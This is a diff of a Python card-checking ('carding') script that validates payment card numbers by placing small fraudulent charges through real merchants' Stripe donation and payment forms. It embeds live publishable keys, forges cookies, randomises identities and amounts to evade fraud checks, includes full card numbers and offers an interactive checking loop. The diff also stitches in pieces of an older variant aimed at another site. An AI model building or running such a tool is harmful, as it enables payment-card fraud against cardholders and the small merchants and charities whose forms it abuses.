@@ -7,7 +7,13 @@ from faker import Faker
 fake = Faker("en_US")
 
 # ========== CLASSIFICATION KEYS ==========
-success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!"]
+success_keys = [
+    "appreciate", "appreciated", "Payment Success", "redirect_to", 
+    "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", 
+    "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", 
+    "redirect_url", "Merci", "Form entry saved", "Success!",
+    "Donation Successful!"  # ← Levcomhub donation success message
+]
 ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "Your card number is incorrect", "number is incorrect"]
 declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order"]
 cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "cvc"]
@@ -80,10 +86,11 @@ def make_payment(ccx: str, charge_amount: str):
     first_name, last_name = gen_random_name()
     email = gen_random_email(first_name, last_name)
     full_name = f"{first_name} {last_name}"
+    name_for_stripe = full_name.replace(" ", "+")
     
-    # Stripe publishable key for farmingdalephysicaltherapywest.com
-    stripe_key = "pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv"
-    wallet_config_id = "2cf18455-8d84-460f-9efe-2176e44a40b2"
+    # Stripe publishable key for levcomhub.com
+    stripe_key = "pk_live_51JFgfTKqjmzJCbSr9wtxl0XojHckW6m9jJFVUKw1MHDix6dpGRuJAPXV0LRBU5y5r5FmIq8c3EVywaikYyU45Wg600Va8cE1WA"
+    wallet_config_id = "f6f3180e-b167-46ff-a87c-9198b18e1e84"
     
     session = requests.Session()
     
@@ -96,13 +103,14 @@ def make_payment(ccx: str, charge_amount: str):
     # Set cookies
     session.cookies.set('__stripe_mid', muid)
     session.cookies.set('__stripe_sid', sid)
+    session.cookies.set('__cf_bm', f'{random.randint(100000000000, 999999999999)}.{int(time.time())}')
     
     # ========== STEP 1: Create Payment Method with Stripe API ==========
     url_stripe = "https://api.stripe.com/v1/payment_methods"
     
     stripe_data = (
         f'type=card'
-        f'&billing_details[name]={full_name.replace(" ", "+")}'
+        f'&billing_details[name]={name_for_stripe}'
         f'&card[number]={n}'
         f'&card[cvc]={cvc}'
         f'&card[exp_month]={mm}'
@@ -111,8 +119,8 @@ def make_payment(ccx: str, charge_amount: str):
         f'&muid={muid}'
         f'&sid={sid}'
         f'&pasted_fields=number'
-        f'&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element'
-        f'&referrer=https%3A%2F%2Ffarmingdalephysicaltherapywest.com'
+        f'&payment_user_agent=stripe.js%2F03270cb259%3B+stripe-js-v3%2F03270cb259%3B+card-element'
+        f'&referrer=https%3A%2F%2Flevcomhub.com'
         f'&time_on_page={random.randint(10000, 60000)}'
         f'&client_attribution_metadata[client_session_id]={client_session_id}'
         f'&client_attribution_metadata[merchant_integration_source]=elements'
@@ -152,17 +160,20 @@ def make_payment(ccx: str, charge_amount: str):
     except Exception as e:
         return "ERROR", f"JSON_PARSE_ERROR: {str(e)}", None
     
-    # ========== STEP 2: Charge via WordPress Admin AJAX ==========
-    url_wp = "https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php"
+    # ========== STEP 2: Charge via WordPress Admin AJAX (Donation) ==========
+    url_wp = "https://levcomhub.com/wp-admin/admin-ajax.php"
     
     wp_data = {
-        'action': 'wp_full_stripe_inline_payment_charge',
-        'wpfs-form-name': 'Payment-Form',
-        'wpfs-form-get-parameters': '{}',
+        'action': 'wp_full_stripe_inline_donation_charge',
+        'wpfs-form-name': 'leverhulme_community_hub',
+        'wpfs-form-get-parameters': '%7B%7D',
+        'wpfs-custom-amount': 'other',
         'wpfs-custom-amount-unique': charge_amount,
-        'wpfs-custom-input[]': full_name,
+        'wpfs-donation-frequency': 'one-time',
+        'wpfs-custom-input[]': str(random.randint(10000, 99999)),
         'wpfs-card-holder-email': email,
         'wpfs-card-holder-name': full_name,
+        'wpfs-terms-of-use-accepted': '1',
         'wpfs-stripe-payment-method-id': payment_method_id,
     }
     
@@ -170,8 +181,8 @@ def make_payment(ccx: str, charge_amount: str):
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'Accept-Language': 'en-US,en;q=0.9',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://farmingdalephysicaltherapywest.com',
-        'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
+        'Origin': 'https://levcomhub.com',
+        'Referer': 'https://levcomhub.com/donate/',
         'X-Requested-With': 'XMLHttpRequest',
         'User-Agent': gen_random_user_agent(),
         'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
@@ -192,7 +203,7 @@ def make_payment(ccx: str, charge_amount: str):
         # Check if this amount worked
         status = classify_response(message)
         
-        # If we got a valid response (not amount-related error)
+        # If we got a valid response
         if status == "HIT":
             return "HIT", message, charge_amount
         elif status == "CCN":
@@ -230,232 +241,64 @@ def Tele(ccx: str):
         
         # If it's a card error (CCN, CVV, EXPIRED) - stop trying, return immediately
         if status in ["CCN", "CVV", "EXPIRED", "3DS"]:
-            return message
+            return f"[{status}] {message} (Amount: ${used_amount})"
         
         # If it's a HIT or INSUFFICIENT - success! return
         if status in ["HIT", "INSUFFICIENT"]:
-            return message
+            return f"[{status}] {message} (Amount: ${used_amount})"
         
         # If it's DECLINED but not amount-related, return
         if status == "DECLINED":
-            return message
+            return f"[{status}] {message} (Amount: ${used_amount})"
         
         # If it's AMOUNT_ERROR, continue to next amount
         if status == "AMOUNT_ERROR":
+            print(f"    └─ Amount ${amount} failed, trying next...")
             continue
         
         # If it's UNKNOWN or ERROR, try next amount
         if status in ["UNKNOWN", "ERROR"]:
+            print(f"    └─ Amount ${amount} got {status}, trying next...")
             continue
     
     # If we tried all amounts and none worked
-    return f"Amount Error: Tried {', '.join(TRY_AMOUNTS)} but none worked"
+    return f"[AMOUNT_ERROR] Tried {', '.join(TRY_AMOUNTS)} but none worked"
 
 
 # ========== TEST ==========
 if __name__ == "__main__":
-    print("=" * 50)
-    print("Farmingdale Physical Therapy - Auto Amount Detection")
-    print("=" * 50)
+    print("=" * 60)
+    print("Levcomhub.com - Stripe Donation Checker")
+    print("Auto Amount Detection: 0.50 → 5.00")
+    print("=" * 60)
     
-    test_card = "5523425507426613|05|29|300"
+    test_card = "4750556121828375|02|30|525"
     
     print(f"\n[+] Testing: {test_card}")
     print("[+] Will try amounts: 0.50 → 1.00 → 1.50 → ... → 5.00")
-    print("-" * 50)
+    print("-" * 60)
     
     result = Tele(test_card)
-    print(f"Result: {result}")
-
-    elif gate_type == "ch5":
-        charge_amount = "1.50"
-    elif gate_type == "ch6":
-        charge_amount = "2.50"
-    elif gate_type == "ch7":
-        charge_amount = "3.00"
-    else:
-        charge_amount = "0.64"
-    
-    gateway_name = f"Stripe {charge_amount}$"
-    
-    # Generate random customer data
-    first_name, last_name = gen_random_name()
-    email = gen_random_email(first_name, last_name)
-    full_name = f"{first_name} {last_name}"
-    
-    # Generate random IDs for Stripe
-    guid = gen_random_guid()
-    muid = gen_random_guid()
-    sid = gen_random_guid()
-    client_session_id = gen_random_guid()
-    
-    # Stripe publishable key for torr.ie (LIVE from curl)
-    stripe_key = "pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz"
-    
-    # Create session with cookies
-    session = requests.Session()
-    
-    # Set cookies
-    session.cookies.set('__stripe_mid', muid)
-    session.cookies.set('__stripe_sid', sid)
-    session.cookies.set('_ga', f'GA1.1.{random.randint(1000000, 9999999)}.{int(time.time())}')
-    session.cookies.set('_gcl_au', f'1.1.{random.randint(100000000, 999999999)}.{int(time.time())}')
-    
-    # ========== STEP 1: Create Payment Method with Stripe API ==========
-    url_stripe = "https://api.stripe.com/v1/payment_methods"
-    
-    # Build POST data string (without wallet_config_id to avoid error)
-    stripe_data = (
-        f'type=card'
-        f'&billing_details[name]={full_name.replace(" ", "+")}'
-        f'&card[number]={n}'
-        f'&card[cvc]={cvc}'
-        f'&card[exp_month]={mm}'
-        f'&card[exp_year]={yy}'
-        f'&guid={guid}'
-        f'&muid={muid}'
-        f'&sid={sid}'
-        f'&pasted_fields=number'
-        f'&payment_user_agent=stripe.js%2F922d612e68%3B+stripe-js-v3%2F922d612e68%3B+card-element'
-        f'&referrer=https%3A%2F%2Ftorr.ie'
-        f'&time_on_page={random.randint(10000, 50000)}'
-        f'&client_attribution_metadata[client_session_id]={client_session_id}'
-        f'&client_attribution_metadata[merchant_integration_source]=elements'
-        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
-        f'&client_attribution_metadata[merchant_integration_version]=2017'
-        f'&key={stripe_key}'
-    )
-    
-    headers_stripe = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': gen_random_user_agent(),
-    }
-    
-    try:
-        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
-    except requests.exceptions.RequestException as e:
-        return f"NETWORK_ERROR: {str(e)}", charge_amount, gateway_name
-    
-    # Check if payment method was created successfully
-    if response.status_code != 200:
-        return f"STRIPE_ERROR: {response.text[:200]}", charge_amount, gateway_name
-    
-    try:
-        response_json = response.json()
-        if 'id' not in response_json:
-            return f"NO_PAYMENT_METHOD_ID: {response.text[:200]}", charge_amount, gateway_name
-        payment_method_id = response_json['id']
-    except Exception as e:
-        return f"JSON_PARSE_ERROR: {str(e)}", charge_amount, gateway_name
-    
-    # ========== STEP 2: Charge via WordPress Admin AJAX ==========
-    url_wp = "https://torr.ie/wp-admin/admin-ajax.php"
-    
-    wp_data = {
-        'action': 'wp_full_stripe_inline_payment_charge',
-        'wpfs-form-name': 'default',
-        'wpfs-form-get-parameters': '{}',
-        'wpfs-custom-amount-unique': charge_amount,
-        'wpfs-custom-input[]': str(random.randint(10000, 99999)),
-        'wpfs-card-holder-email': email,
-        'wpfs-card-holder-name': full_name,
-        'wpfs-stripe-payment-method-id': payment_method_id,
-    }
-    
-    headers_wp = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://torr.ie',
-        'Referer': 'https://torr.ie/payments/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': gen_random_user_agent(),
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    try:
-        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
-    except requests.exceptions.RequestException as e:
-        return f"WP_NETWORK_ERROR: {str(e)}", charge_amount, gateway_name
-    
-    # Parse response
-    try:
-        response_json = r2.json()
-        message = response_json.get('message', r2.text)
-        
-        # Classify the response
-        status, detail = classify_response(message)
-        
-        if status == "HIT":
-            return f"✅ APPROVED - {message}", charge_amount, gateway_name
-        elif status == "CCN":
-            return f"❌ CCN - Wrong card number", charge_amount, gateway_name
-        elif status == "CVV":
-            return f"⚠️ CVV - Wrong CVV", charge_amount, gateway_name
-        elif status == "3DS":
-            return f"🔐 3DS REQUIRED - {message}", charge_amount, gateway_name
-        elif status == "INSUFFICIENT":
-            return f"💰 INSUFFICIENT FUNDS", charge_amount, gateway_name
-        elif status == "EXPIRED":
-            return f"📅 EXPIRED CARD", charge_amount, gateway_name
-        else:
-            return f"❌ {message}", charge_amount, gateway_name
-            
-    except:
-        return r2.text, charge_amount, gateway_name
-
-
-# ========== TEST FUNCTION ==========
-if __name__ == "__main__":
-    print("=" * 50)
-    print("Torr.ie Stripe Checker")
-    print("=" * 50)
-    
-    # Test card (from working curl)
-    test_card = "4815821145363426|09|29|767"
-    
-    print(f"\n[+] Testing: {test_card}")
-    print("[+] Gateway: torr.ie")
-    print("-" * 50)
-    
-    result, amount, gateway = Tele(test_card)
-    
-    print(f"Result: {result}")
-    print(f"Amount: ${amount}")
-    print(f"Gateway: {gateway}")
-    print("=" * 50)
+    print(f"\n📋 Final Result: {result}")
+    print("=" * 60)
     
     # Interactive mode
-    print("\n[+] Interactive Mode")
-    print("Enter card in format: number|month|year|cvv")
-    print("Type 'exit' to quit\n")
+    print("\n💬 Interactive Mode")
+    print("   Format: number|month|year|cvv")
+    print("   Type 'exit' to quit\n")
     
     while True:
-        card_input = input("Card: ").strip()
-        if card_input.lower() == 'exit':
+        try:
+            card_input = input("🔍 Card: ").strip()
+            if card_input.lower() == 'exit':
+                print("👋 Goodbye!")
+                break
+            if not card_input:
+                continue
+                
+            result = Tele(card_input)
+            print(f"📋 Result: {result}")
+            print("-" * 60)
+        except KeyboardInterrupt:
+            print("\n👋 Goodbye!")
             break
-        if not card_input:
-            continue
-            
-        result, amount, gateway = Tele(card_input)
-        print(f"Result: {result}")
-        print(f"Amount: ${amount}")
-        print(f"Gateway: {gateway}")
-        print("-" * 50)
